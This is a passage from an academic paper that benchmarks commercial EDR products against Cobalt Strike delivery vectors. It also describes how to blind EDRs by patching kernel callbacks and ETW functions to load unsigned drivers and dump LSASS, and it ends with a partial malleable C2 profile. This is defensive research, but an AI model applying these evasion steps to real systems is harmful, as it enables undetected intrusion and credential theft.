and\nallows the creation of custom IOAs based on process creation, network connections, and\nfile creation, among others.\n\n4.2.1. Enabled Settings\n\nFor this EDR, we used an aggressive policy enabling as much features as possible.\nIt was a policy already used in a corporate environment with its goal being maximum\nprotection and minimum disruption.\n\n4.2.2. DLL-CPL-HTA\n\nNone of these three attack vectors produced any alerts and allowed the Cobalt Strike\nbeacon to be executed covertly.\n\n4.2.3. EXE\n\nQuite interestingly, the EXE was detected, although direct system calls were used to\nbypass user-mode hooking. Note that the alert is of medium criticality. In addition, please\nnote the spoofed parent process in Figure 8.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 400\n\n**Figure 8. CrowdStrike catching the ‘Early-Bird’ injection despite the use of direct syscalls.**\n\n_4.3. ESET PROTECT Enterprise_\n\nESET PROTECT Enterprise is a widely used EDR solution that uses behavior and\nreputation systems to mitigate attacks. Moreover, it uses cloud sandboxing to prevent zeroday threats and full disk encryption for enhanced data protection. The EDR uses real-time\nfeedback collected from million of endpoints using, among others, kernel callbacks, ETW\n(Event Tracing for Windows), and hooking. ESET PROTECT Enterprise allows fine-tuning\nthrough editing XML files and customizing policies depending on users and groups. For\nthis, blue teams may use a file name, path, hash, command line, and signers to determine\nthe trigger conditions for alerts.\nWe used ESET PROTECT Enterprise with the maximum available predefined settings,\nas in Figure 9, without further fine tuning.\n\n**Figure 9. ESET PROTECT Enterprise settings.**\n\n4.3.1. Enabled Settings\n\nFor this EDR, we used the predefined policy for maximum security, as stated by\nESET in the console. This makes use of machine learning, deep behavioral inspection, SSL\nfiltering, and PUA detection, and we decided to hide the GUI from the end user.\n\n4.3.2. EXE-DLL\n\nBoth these attack vectors were successfully executed, without the EDR blocking and\nreporting any alert; see Figure 10.\n\n**Figure 10. Bypassing ESET PROTECT Enterprise with the EXE and DLL attacks.**\n\n4.3.3. CPL-HTA\n\nThe CPL and HTA attacks were correctly identified and blocked by ESET PROTECT\nEnterprise; see Figures 11 and 12, respectively. It should be noted that the memory scanner\nof ESET correctly identified malicious presence but falsely named the threat as Meterpreter.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 401\n\n**Figure 11. ESET PROTECT Enterprise detects the HTA attack.**\n\n**Figure 12. ESET PROTECT Enterprise detects the CPL attack.**\n\n_4.4. F-Secure Elements Endpoint Detection and Response_\n\nF-Secure Elements EDR collects behavioral events from the endpoints, including file\naccess, processes, network connections, registry changes, and system logs. To achieve this,\nthe EDR uses Event Tracing for Windows. While F-Secure Elements EDR uses machine\nlearning for correlating information, human intervention from cyber-security experts\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 402\n\nis often used. The EDR also features built-in incident management. Moreover, after a\nconfirmed detection, F-Secure Elements EDR has built-in guidance to facilitate users in\ntaking the necessary steps to contain and remediate the detected threat.\n\nEnabled Settings\n\nIn terms of our experiments, all features were enabled, including DeepGuard. We\nalso included browsing control based on reputation, and the firewall was up and running.\nNotably, all of the launched attacks were successful, and F-Secure Elements EDR reported\nno alerts; see Figure 13.\n\n**Figure 13. F-Secure Elements EDR console after launching our attacks reports no security event.**\n\n_4.5. Kaspersky Endpoint Detection and Response-KEDR_\n\nKaspersky’s EDR (KEDR) is a highly tunable EDR, collaborating with other endpoint\nprotection systems, even from different vendors. This way, the latter try to address broader\nattacks, while KEDR focuses on advanced attacks. Beyond the traditional hooking mechanisms, this EDR allows endpoints to use advanced pre-processing and sandboxing, which\nare more computationally intensive. Moreover, it features tools for incident investigation,\nproactive threat hunting and attack response. Logs and events are sent to the central node,\nbut further telemetry is sent when deemed necessary by the central node, significantly\nreducing the central node’s overall network and storage cost. Moreover, KEDR uses kernel\nhooking using a specialized hypervisor. This comes with several downsides as it requires\n[virtualization support (https://github.com/iPower/KasperskyHook accessed on 8 July](https://github.com/iPower/KasperskyHook)\n2021).\n\n4.5.1. Enabled Settings\n\nIn our experiments, we enabled all security-related features in every category. However, we did not employ any specific configuration for Web and Application controls. More\nprecisely, we created a policy and enabled all options, including behavior detection, exploit\nand process memory protection, HIPS, Firewall, AMSI, and FileSystem protection modules.\nThe actions were set to block and delete all malicious artifacts and behaviors.\n\n4.5.2. CPL-HTA-EXE\n\nIn the case of CPL, HTA, and EXE attack vectors, KEDR identified and blocked our\nattacks in a timely manner; see Figure 14. More precisely, the EXE and CPL processes were\nkilled after execution, while the HTA was blocked as soon as it touched the disk.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 403\n\n**Figure 14. Screenshots from KEDR illustrating the malicious activity that it detected and blocked.**\n\n4.5.3. DLL\n\nOur DLL attack was successfully launched, and no telemetry was recorded by KEDR.\n\n_4.6. McAfee Endpoint Protection_\n\nMcAfee Endpoint Protection is among the most configurable and friendly to the\ntechnical user solutions, it allows reacting to specific process behaviors, i.e., remote memory\nallocation, but also to proactively eliminate threats by reducing the options an attacker\nhas based on a handful of options, such as blocking program registration to autorun. We\ndecided to leverage this configurability and challenge McAfee to the full extend and only\ndisabled one rule blocking execution from common folders, such as the Desktop folder.\nThe rationale behind this choice is usability since activating this rule would cause many\nusability issues in an everyday environment.\nIn our experiments, we managed to successfully bypass the restrictions using our\ndirect syscalls dropper and allocate memory remotely, as well as execute it. The latter is an\nindicator that the telemetry providers and processing of the information is not efficient.\n\n4.6.1. Enabled Settings\n\nFor this EDR, we decided to challenge McAfee since it offers a vast amount of settings and a lot of option for advanced users, such as memory allocation controls, etc. It\nwas also quite interesting that some policies were created by default to block suspicious\nactivities, such as our HTA’s execution. We opted to enable all options without exception,\napart from one that was block execution from user folders and would cause issues in a\ncorporate environment.\nAn excerpt of the settings that were enabled is illustrated in Figure 15.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 404\n\n**Figure 15. An excerpt of the settings that were enabled in McAfee Endpoint Protection.**\n\n4.6.2. HTA-CPL\n\nBoth HTA- and CPL-based attacks were identified and blocked. However, it should\nbe noted that the HTA attack was blocked due to the applied policy of blocking execution\nof all HTA files; see Figure 16.\n\n**Figure 16. McAfee Endpoint Protection blocking the HTA attack.**\n\n4.6.3. EXE-DLL\n\nBoth the EXE- and DLL-based attacks were successfully executed without being\nidentified by the EDR nor producing any telemetry.\n\n_4.7. Sentinel One_\n\nSentinel One has sophisticated AI-based behavioral analysis features that make stealth\ninfiltration and tool execution rather difficult. Among others, Sentinel One collects ETW\ntelemetry and monitors almost all parts of the system. It uses kernel callbacks to collect\ninformation, such as process creation, image load, thread creation, handle operations, and\nregistry operations. It also produces detailed attack paths and process tree graphs.\nOur results indicate that the Sentinel One has severe issues in handling PowerShellbased post-exploitation activities. Thus, one could easily run tools, such as PowerView,\nusing the powershell command of Cobalt Strike and some IEX cradles.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 405\n\n4.7.1. Enabled Settings\n\nFor this solution, we decided to enable all the features needed using the buttons in\nthe console to use its engines, including static and behavioral AI, script, lateral movement,\nfileless threat detection, etc. Moreover, we enabled all the features Deep Visibility provides\napart from the full disk scan and data masking. We also chose to kill processes and\nquarantine the files.\n\n4.7.2. EXE-HTA-CPL\n\nNotably, none of these attack vectors issued an alert to Sentinel One.\n\n4.7.3. DLL\n\nAs soon as the folder with the MS-Teams installation touched the disk, an alert was\ntriggered, indicating that the malicious DLL was unsigned, and this could be a potential risk.\nAs it can be observed in Figure 17, the high entropy of our DLL was detected as an IoC.\nThe IoC was correct as our shellcode was AES encrypted. It should be noted that previous\nexperiments with Sentinel One with low entropy files (using XOR encoding) passed the\ntest without any issues, implying that the actual issues were due to the high entropy of\nthe DLL.\n\n**Figure 17. Sentinel One reporting the DLL attack.**\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 406\n\n_4.8. Sophos Intercept X with EDR_\n\nSophos Intercept is one of the most well-known and trusted AVs/EDRs. It has been\n[previously used as a test case for user-mode hook evasion (https://www.mdsec.co.uk/2020](https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/)\n[/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/ accessed](https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/)\non 8 July 2021). The EDR version provides a complete view of the incidents and really\ndetailed telemetry, as well as a friendly interface with insightful graphs. Some of its features\ncan be seen Figure 18.\n\n4.8.1. Enabled Settings\n\nIn the case of Sophos, the configuration was simple and intuitive for the user. Therefore, we enabled all offered features, which provided protection without usability issues.\n\n4.8.2. EXE\n\nThis was the only vector that worked flawlessly against this EDR. In fact, only a small\nhighlight event was produced due to its untrusted nature because it was not signed. PPID\nspoofing worked, and no alerts were produced, but the activities of werfault.exe were\nlogged by Sophos, e.g., the connection to our domain. See Figure 19.\n\n**Figure 18. The settings for Sophos.**\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 407\n\n**Figure 19. Executable was able to run the shellcode and connect to the C2.**\n\n4.8.3. DLL\n\nUnfortunately, the malicious DLL could not be loaded, yet the EDR produced no alert.\nInterestingly, the application was executed normally without the DLL in the folder. We\nassume that there might be some interference due to the EDR’s process protection features\nas the payload was functioning normally.\n\n4.8.4. CPL\n\nAs soon as the .cpl file was executed, an alert was produced, the process was blocked,\nand the attack path in Figure 20 was created. As it can be observed, detailed telemetry was\nproduced about the system’s activities.\n\n**Figure 20. CPL was blocked by Sophos. Details and graph.**\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 408\n\n4.8.5. HTA\n\nAs soon as the iexplore.exe visited and downloaded the hta file, its actions were\nblocked, and detailed attack telemetry was produced once again. See Figures 21 and 22.\n\n**Figure 21. HTA was blocked by Sophos. Details and graph.**\n\n**Figure 22. Network connections to our domain as logged by Sophos.**\n\n_4.9. Symantec Endpoint Protection_\n\nSymantec Endpoint Protection is a well-known solution and among the most used\nones in multiple industries. It combines a highly sophisticated static detection engine\nwith emulators. The latter considers anti-evasion techniques, addressing packed malware\nobfuscation techniques, and detects the malware that is hidden inside even custom packers.\nSymantec Endpoint Protection uses a machine learning engine to determine whether a file\nis benign or malicious through a learning process. Symantec Security Response trains this\nengine to recognize malicious attributes and defines the machine learning engine’s rules\nto make detections. Symantec leverages its cloud service to confirm the detection that the\nmachine learning engine made. To protect endpoint devices, it launches a specially antimalware mechanism on startup, before third-party drivers initialize, preventing the actions\n[of malicious drivers and rootkits, through an ELAM driver (https://docs.microsoft.com/](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements)\n[en-us/windows-hardware/drivers/install/elam-driver-requirements accessed on 8 July](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements)\n2021). The EDR is highly configurable and easy to adapt to everyday enterprise life, with a\npowerful HIDS and network monitoring which enable it to identify and block networkbased lateral movement, port scans, as well as common malware network behavior, e.g.,\nmeterpreter’s default HTTPS communication.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 409\n\n4.9.1. Enabled Settings\n\nWe enabled the default features using the default levels of protection. They were\nenough to provide adequate protection without causing issues.\n\n4.9.2. HTA\n\nIn our attacks, Symantec Endpoint Protection managed to identify and block only the\nHTA attack; see Figure 23. However, no alert was raised to the user.\n\n**Figure 23. Identified and blocked HTA attack from Symantec Endpoint Protection.**\n\n4.9.3. CPL-EXE-DLL\n\nAll three attack vectors (CPL, EXE, and DLL) were successful, without the EDR\nidentifying, blocking them, or producing any alert.\n\n_4.10. Trend Micro Apex One_\n\nApex One is a well-known solution and ranked among the top ones on Gartner’s table.\nIts overall features, beyond the basic protection and firewall capabilities, include predictive\nmachine learning, and it can also be used for offline protection. The lightweight, offline\nmodel helps to protect the endpoints against unknown threats even when a functional\nInternet connection is not unavailable. Security Agent policies provide increased real-time\nprotection against the latest fileless attack methods through enhanced memory scanning for\nsuspicious process behaviors. Security Agents can terminate suspicious processes before\nany damage can be done. Enhanced scan features can identify and block ransomware\nprograms that target documents that run on endpoints by identifying common behaviors\nand blocking processes commonly associated with ransomware programs. You can configure Security Agents to submit file objects containing previously unidentified threats to a\nVirtual Analyzer for further analysis. After assessing the objects, Virtual Analyzer adds\nthe objects it determined to contain unknown threats to the Virtual Analyzer Suspicious\nObjects lists and distributes the lists to other Security Agents throughout the network.\nFinally, Behavior Monitoring constantly monitors endpoints for unusual modifications to\nthe operating system and installed software.\nAccording to our research, Apex One uses network, kernel callbacks, and hooking;\nin both kernel and usermode, ETW, and AMSI to perform behavioral detection. More\nspecifically, for ETW, Apex One uses a data collector called TMSYSEVT_ETW.\n\n4.10.1. Enabled Settings\n\nIn Apex One, we leveraged as much features as possible that were presented in the\npolicy editor, such as the EDR’s smart scanning method, intelliscan, scanning of compressed\nfiles, OLE object scanning, intellitrap (a feature used to combat real time compression of\nmalware), ransomware protection (behavioral protection against ransomware, not needed\nfor our tests), anti-exploit protection, monitoring of newly encountered programs, C&C\ntraffic filtering, and, of course, predictive machine learning. Finally, we configured the EDR\nto block all malicious behavior.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 410\n\n4.10.2. EXE-DLL\n\nBoth EXE and DLL attacks were successfully launched. Apex One did not identify nor\nblock them, and no alerts were raised by the EDR.\n\n4.10.3. CPL-HTA\n\nWhile the HTA attack was launched, Apex One identified the threat and blocked it;\nhowever, it did not raise any alert, as shown in Figure 24. On the contrary, the CPL attack\nwas detected, blocked, and triggered the proper alert; see Figure 25.\n\n**Figure 24. HTA attack against Apex One.**\n\n**Figure 25. Detected and blocked CPL attack against Apex One.**\n\n_4.11. Windows Defender for Endpoints (ATP)_\n\nWindows Defender for Endpoints is heavily kernel-based, rather than user-based,\nwhich allows for great detection capabilities. The beauty of MDATP lies in the fact that\nmost of the detection capability lies in Windows itself, albeit not utilized unless the machine\nis onboarded. For these tests, the EDR was set to block mode to prevent instead of merely\ndetecting. Its telemetry sources include kernel callbacks utilized by the WdFilter.sys\nmini-filter driver. As previously mentioned, callbacks are set to “intercept” activities once\na condition is met, e.g., when module is loaded. As an example of those, consider:\n\n           - PsSetCreateProcessNotifyRoutine(Ex)-Process creation events.\n\n           - PsSetCreateThreadNotifyRoutine-Thread creation events.\n\n           - PsSetLoadImageNotifyRoutine-Image(DLL/Driver) load events.\n\n           - CmRegisterCallback(Ex)-Registry operations.\n\n           - ObRegisterCallbacks-Handle operations(Ex: process access events).\n\n           - FltRegisterFilter-I/O operations(Ex: file system events).\n\nThey also include a kernel-level ETW provider rather than user-mode hooks. This\ncomes as a solution to detecting malicious API usage since hooking the SSDT (System\nService Dispatch Table) is not allowed, thanks to Kernel Patch Protection (KPP) PatchGuard\n(PG). Before moving on, we should note a different approach taken by Kaspersky: to hook\nthe kernel, it made use of its own hypervisor.\nSince Windows 10 RS3, the NT kernel is instrumented using EtwTi functions for various APIs commonly abused for process injection, credential dumping, etc., and the teleme[try available via a secure ETW channel (https://blog.redbluepurple.io/windows-security-](https://blog.redbluepurple.io/windows-security-research/kernel-tracing-injection-detection)\n[research/kernel-tracing-injection-detection accessed on 8 July 2021). Thus, MDATP heavily](https://blog.redbluepurple.io/windows-security-research/kernel-tracing-injection-detection)\nrelies on EtwTi, in some cases even solely, for telemetry.\nAs an example of the ETWTi sensor, consider the alert below Figure 26. It is an alert\nproduced by running our EXE payload on a host that ATP is in passive mode. Note that,\nalthough our payload uses direct system calls, our injection is detected.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 411\n\n**Figure 26. Example of ATP catching the APC Early-Bird injection, although direct syscalls were used.**\n\nDue to the fact that the callbacks operate at the kernel level (Ring 0), an attacker needs\nto have high integrity level code execution in a machine to blind them or render them\nuseless successfully. An attacker may choose any one of the following three techniques to\nachieve this:\n\n           - Zero out the address of the callback routine from the kernel callback array that stores\nall the addresses.\n\n           - Unregister the callback routine registered by WdFilter.sys.\n\n           - Patch the callback routine of WdFilter.sys with a RET(0xc3) instruction or hook it.\n\nDue to the nature of the ETWTi Sensor telemetry, it is not possible to blind the sources\nfrom a medium-IL context and needs admin/a high-IL context. Once this is achieved, an\nattacker may employ any one of the following methods:\n\n           - Patch a specific EtwTi function by inserting a RET/0xC3 instruction at the beginning\nof the function so that it simply returns without executing further. Not KPP-safe, but\nan attacker may avoid BSOD-ing the target by simply restoring the original state of\nthe function as soon as their objective is accomplished. In theory, Patch Guard may\ntrigger at any random time, but, in practice, there is an extremely low chance that PG\nwill trigger exactly during this extremely short interval.\n\n           - Corrupt the EtwTi handle.\n\n           - Disable the EtwTi provider.\n\n4.11.1. Enabled Settings\n\nWe enabled all the basic features, including the tamper protection, the block mode\noption, and auto investigation. Most are handled in the background, and the admins are\nable to configure connection to intune, which was out of scope. We also enabled file and\nmemory content analysis using the cloud that will upload suspicious files and check them.\n\n4.11.2. CPL-EXE-HTA\n\nMost of these vectors were detected as soon as they touched the disk or were executed.\nFind the relevant alerts in Figure 27.\n\n**Figure 27. Alerts produced by ATP in total.**\n\nNote that, for the .cpl file, despite the fact that the EDR detected it, it was executed\nwith a fully functional beacon session. See Figure 28.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 412\n\n**Figure 28. Details about the alerts produced from ATP.**\n\nFind below the relevant auto-investigation started for this ATP incident, including\nall the alerts produced. Note that, until successful remediation and full verdict, the\ninvestigation may take a lot of time. See Figure 29.\n\n**Figure 29. Auto investigation by ATP.**\n\n4.11.3. DLL\n\nThe DLL side-loading attack was successful as the EDR produced no alerts nor any suspicious timeline events. Figure 30 illustrates the produced telemetry. Notice the connection\nto our malicious domain and the uninterrupted loading of our module.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 413\n\n**Figure 30. Timeline events for DLL sideloading by ATP.**\n\n_4.12. Aggregated Results_\n\nTable 1 illustrates an aggregated overview of our findings. Evidently, from the 20\nattacks that were launched, more than half of them were successful. It is rather alarming\nthat none of the EDRs managed to detect all of the attacks. More precisely, 10 attacks\nwere completely successful, as they were completed successfully, and no alert was issued;\n3 attacks were successful, yet they issued a low significance alert; 1 attack was not successful,\nyet it did not issue an alert; and 6 attacks were detected and correctly reported by the EDRs.\n\n**Table 1. Aggregated results of the attacks for each EDR. Notation: \u0013: Successful attack, •: Successful**\nattack, raised minor alert, ⋆: Successful attack, alert was raised ◦:Unsuccessful attack, no alert raised,\n\u0017: failed attack, alerts were raised.\n\n**EDR** **CPL** **HTA** **EXE** **DLL**\n\nCarbon Black _•_ \u0017 \u0013 \u0013\n\nCrowdStrike Falcon \u0013 \u0013 _•_ \u0013\n\nESET PROTECT Enterprise \u0017 \u0017 \u0013 \u0013\n\nF-Secure Elements Endpoint Detection and Response \u0013 \u0013 \u0013 \u0013\n\nKaspersky Endpoint Detection and Response \u0017 \u0017 \u0017 \u0013\n\nMcAfee Endpoint Protection \u0017 \u0017 \u0013 \u0013\n\nSentinel One \u0013 \u0013 \u0013 \u0017\n\nSophos Intercept X with EDR \u0017 \u0017 \u0013                     \nSymantec Endpoint Protection \u0013 \u0017 \u0013 \u0013\n\nTrend micro Apex One \u0013 _◦_ \u0013 \u0013\nWindows Defender for Endpoints _⋆_ \u0017 \u0017 \u0013\n\n**5. Tampering with Telemetry Providers**\n\nApart from finding ‘blind spots’ for each EDR, there is also the choice of ‘blinding’\nthem by tampering with their telemetry providers in various ways. Unhooking user-mode\nhooks and utilizing syscalls to evade detection is the tip of the iceberg [18]. The heart of\nmost EDRs lies in the kernel itself as they utilize mini-filter drivers to control file system\noperations and callbacks in general to intercept activities, such as process creation and\nloading of modules. As attackers, once high integrity is achieved, one may effectively\nattack the EDRs in various ways, including patching the ETWTi functions of Defender for\nEndpoints and removing callbacks of the Sophos Intercept X to execute hacking tools and\nremain uninterrupted. Note that our goal during the following POCs was not to raise any\nalert in the EDR consoles, something that was successfully achieved.\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 414\n\n_5.1. Attacking Defender for Endpoints_\n\nIn what follows, we present two attacks, both executed manually using WinDBG. To\ncircumvent the Patch Guard protection mechanism, we performed all actions quickly to\navoid introducing noise that could trigger the EDR. Note that the EDR was in passive mode\nfor this test since we are only interested in silencing the produced alerts.\n\n5.1.1. Manually Patching Callbacks to Load Unsigned Drivers\n\nIn this case, our process will be manually patching some of the contents of\nthe PspLoadImageNotifyRoutine global array, which stores the addresses of all the\nregistered callback routines for image loading. By patching the callback called\n```\n             SecPsLoadImageNotify, which is registered with the mssecflt.sys driver, we are es\n```\nsentially blinding the EDR as far as loading of drivers is concerned.\nIt is important to note here how the EDR detects whether the Driver Signature Enforcement (DSE) is disabled. Strangely, the alert about a possibly disabled DSE is triggered\nonce an unsigned driver is loaded. Therefore, the ATP assumes that, since an unsigned\ndriver has been loaded, the DSE was disabled. See Figure 31.\n\n**Figure 31. DSE Alert by ATP. Telemetry Sourcerer driver detection.**\n\nThen, after the callback is patched, we will zero-out the g_CiOptions global variable\nwhose default value is 0x6, indicating that DSE is on. Then, we load our driver using the\nOSR driver loader utility. Afterwards, we reset the g_CiOptions variable and the patched\ncallback to avoid a possible bug check by Patch Guard and, thus, our system crashing. See\nFigure 32.\n\n5.1.2. Manually Patching an ETWTi Function to Dump LSASS without Alerts\n\nIn this POC, we manually patch the EtwTiLogReadWriteVm function, see Figure 33,\nwhich is responsible for the telemetry of the NtReadVirtualMemory syscall, which is called\nfrom MiniDumpWriteDump which is used by many Local Security Authority Subsystem\nService (LSASS) dumping tools. We are using the Outflank-Dumpert tool [19] to dump the\nLSASS memory that uses direct syscalls, which may evade most common EDRs but not\nATP; see Figure 34.\nFind below the procedure we followed to achieve an ‘undercover’ LSASS dump.\nNote how we convert the virtual address to the physical address to execute our patch\nsuccessfully. This is because this is a read-only page we want to write at, and any forced\nattempt to write there will result in a blue screen of death. However, we may write on the\nphysical address without any trouble. Notably, while timeline events will most likely be\nproduced, no alert will be triggered that will make SOCs investigate it further.\n\n\n**Figure 31. DSE Alert by ATP. Telemetry Sourcerer driver detection.**\n\nThen, after the callback is patched, we will zero-out the g_CiOptions global variable\nwhose default value is 0x6, indicating that DSE is on. Then, we load our driver using the\nOSR driver loader utility. Afterwards, we reset the g_CiOptions variable and the patched\ncallback to avoid a possible bug check by Patch Guard and, thus, our system crashing. See\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 415\n\n**Figure 32. Deleting the callback necessary.**\n\n**Figure 33. Patching the ETWTi function necessary.**\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 416\n\n**Figure 34. Sample Alert caused by Dumpert.**\n\n_5.2. Attacking Sophos Intercept X_\n\nFor this EDR, our approach is quite different. We utilize a legitimate and signed\ndriver that is vulnerable, and, by exploiting it, we may access the kernel and load a custom unsigned driver. The tools we will be using are going to be TelemetrySourcerer\n[(https://github.com/jthuraisamy/TelemetrySourcerer accessed on 8 July 2021) that will](https://github.com/jthuraisamy/TelemetrySourcerer)\nprovide us with the unsigned driver that will actually suppress the callbacks for us, and we\nwill communicate with it through an application that will provide us with a GUI, as well\n[as gdrv-loader (https://github.com/alxbrn/gdrv-loader accessed on 8 July 2021) that will](https://github.com/alxbrn/gdrv-loader)\nexploit the vulnerable driver of Gigabyte and load our driver. Beyond Sophos Intercept X,\n```\n             TelemetrySourcerer can be used in other EDR referred in this work, but, for the sake of\n\n```\nsimplicity and clarity, we use it only for this EDR use case here.Note that the EDR was in\nblock mode for these tests, but we managed to bypass it and completed our task without\nraising any alerts; see Figures 35 and 36.\n\n**Figure 35. Loading an unsigned driver via gdrv-loader.**\n\n**Figure 36. Deleting Sophos’ callbacks via Telemetry Sourcerer’s UI.**\n\nOnce we suppress all the callbacks by the sophosed.sys driver, the EDR cannot\nmonitor, among others, process creations and filesystem activities. Therefore, one may\neasily execute arbitrary code on the tools without the EDR identifying them, e.g., one may\nlaunch Mimikatz and remain uninterrupted, clearly showing the EDR’s inability to ‘see’ it;\nsee Figure 37.\n\n\n**Figure 35. Loading an unsigned driver via gdrv-loader.**\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 417\n\n**Figure 37. Running mimikatz without interruption.**\n\nNevertheless, the user-mode hooks are still in place. Therefore, tools, like Shellycoat\n[of AQUARMOURY and the Unhook-BOF (https://github.com/rsmudge/unhook-bof last ac-](https://github.com/rsmudge/unhook-bof)\ncessed: 8 July 2021), for Cobalt Strike may remove them for a specific process or the\nbeacon’s current process; see Figure 38.\n\n**Figure 38. Sophos’s usermode API hooks.**\n\n**6. Conclusions**\n\nThroughout this work, we went through a series of attack vectors used by advanced\nthreat actors to infiltrate organizations. Using them, we evaluated state-of-the-art EDR\nsolutions to assess their reactions, as well as the produced telemetry. In this context, we\nprovided an overview for each EDR and the measures used to detect and respond to an\nincident. Quite alarmingly, we illustrate that no EDR can efficiently detect and prevent the\nfour attack vectors we deployed. In fact, the DLL sideloading attack is the most successful\nattack as most EDRs fail to detect, let alone block, it. Moreover, we show that one may\nefficiently blind the EDRs by attacking their core, which lies within their drivers at the\nkernel level. In future work, we plan to assess positive, false negative, and false positive\nresults produced by different EDRs to measure the noise that blue teams face in real-world\nscenarios. Moreover, the response time of EDRs will be measured as some EDRs may\nreport attacks with huge delays, even if they have mitigated them. These aspects may\nsignificantly impact the work of blue teams and have not received the needed coverage in\nthe literature.\nBeyond Kaspersky’s hooking solution, vendors may opt for other approaches\n[(https://github.com/rajiv2790/FalconEye accessed on 8 July 2021) with possible stability](https://github.com/rajiv2790/FalconEye)\nissues. However, most vendors prefer to use cloud sandboxes for analysis as this prevents\ncomputational overhead. It should be noted that attackers may use signed drivers and\nhypervisors, e.g., Kaspersky’s, to launch their attacks and hook the kernel without issues\nin rootkits.\nUnfortunately, no solution can provide complete security for an organization. Despite\nthe significant advances in cybersecurity, an organization needs to deploy a wide array\nof tools to remain secure and not solely depend on one solution. Moreover, manual\nassessment of security logs and a holistic overview of the events are needed to prevent\ncyber attacks, especially APTs. Due to the nature of the latter, it is essential to stress the\nhuman factor [20–22], which in many cases is the weakest link in the security chain and\nis usually exploited to get initial access to an organization. Organizations must invest\nmore in their blue teams so that they do not depend on the outputs of a single tool and\nlearn to respond to beyond a limited set of specific threats. This will boost their capacity\nand raise the bar enough to prevent many threat actors from penetrating their systems.\nMoreover, by increasing their investments on user awareness campaigns and training\nregarding the modus operandi of threat actors, the organization’s overall security will\n\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 418\n\nsignificantly increase. Finally, the introduction of machine learning and AI in security is\nexpected to improve the balance in favor of the blue teams in mitigating cyber attacks as\nsignificant steps have already been made by researchers. Advanced pattern recognition and\ncorrelation algorithms are finding their way in security solutions, and EDRs, in particular,\ndetecting or even preventing many cyber attacks in their early stages, decreasing their\npotential impact.\nThe tighter integration of machine learning and artificial intelligence in current EDRs\nmust be accompanied by the use of explainability and interpretable frameworks. The\nlatter may enable both researchers and practitioners to understand the reasons behind false\npositives and facilitate in reducing them. Moreover, the potential use of this information as\ndigital evidence with a proper argumentation in a court of law will lead more researchers\nto devote more efforts in this aspect in the near future. Finally, the efficient collection\nof malicious artefacts is a challenge as, beyond the veracity of the data that have to\nbe processed, their volume and velocity imply further constraints for the monitoring\nmechanisms. The security mechanisms not only have to be applied in a timely manner,\nbut they also have to be made in a seamless way so that they do not hinder the running\napplications and services. Therefore, researchers have to find better sampling and feature\nextraction methods to equip EDRs to allow them to collect the necessary input without\nhindering the availability and operations of the monitored systems.\n\n**Author Contributions: Conceptualization, G.K. and C.P.; methodology, G.K. and C.P.; software, G.K.;**\nvalidation, G.K. and C.P.; investigation, G.K. and C.P.; data curation, G.K. and C.P.; writing—original\ndraft preparation, G.K. and C.P.; writing—review and editing, G.K. and C.P.; visualization, G.K. and\nC.P.; supervision, C.P.; project administration, C.P.; funding acquisition, C.P. All authors have read\nand agreed to the published version of the manuscript.\n\n**Funding: This work was supported by the European Commission under the Horizon 2020 Pro-**\n[gramme (H2020), as part of the projects CyberSec4Europe (https://www.cybersec4europe.eu ac-](https://www.cybersec4europe.eu)\n[cessed on 8 July 2021) (Grant Agreement no. 830929) and LOCARD (https://locard.eu accessed on](https://locard.eu)\n8 July 2021) (Grant Agreement no. 832735). The content of this article does not reflect the official\nopinion of the European Union. Responsibility for the information and views expressed therein lies\nentirely with the authors.\n\n**Acknowledgments: G. Karantzas dedicates this work in loving memory of Vasilis Alivizatos (1938–**\n2021).\n\n**Conflicts of Interest: The authors declare no conflict of interest.**\n\n**Appendix A. Cobalt Strike Malleable C2 Profile**\n\n**Listing A1. Cobalt Strike malleable C2 profile.**\n```\nhttps-certificate {\nset keystore \"a-banking.com.store\";\nset password \"REDACTED\";\n}\nset sleeptime \"2100\";\nset jitter \"10\";\nset maxdns \"242\";\nset useragent \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/6.0)\";\nset dns_idle \"8.8.4.4\";\nhttp-get {\nset uri \"/search/\";\nclient {\nheader \"Host\" \"www.a-banking.com\";\nheader \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";\nheader \"Cookie\" \"DUP=Q=sSVBQtOPvz67FQGHOSGQUVE&Q=821357393&A=6&CV\";\nmetadata {\nbase64url;\nparameter \"q\";\n\n```\n\n-----\n\n_J. Cybersecur. Priv. 2021, 1_ 419\n```\n}\nparameter \"go\" \"Search\";\nparameter \"qs\" \"bs\";\nparameter \"form\" \"QBRE\";\n}\nserver {\nheader \"Cache-Control\" \"private, max-age=0\";\nheader \"Content-Type\" \"text/html; charset=utf-8\";\nheader \"Vary\" \"Accept-Encoding\";\nheader \"Server\" \"Microsoft-IIS/8.5\";\nheader \"Connection\" \"close\";\noutput {\nnetbios;\nprepend \"<!DOCTYPE html><html lang=\\\"en\\\" xml:lang=\\\"en\\\" xmlns=\\\"http://www.w3.org/1999/xhtml\\\"\n\n```\n_�→_ 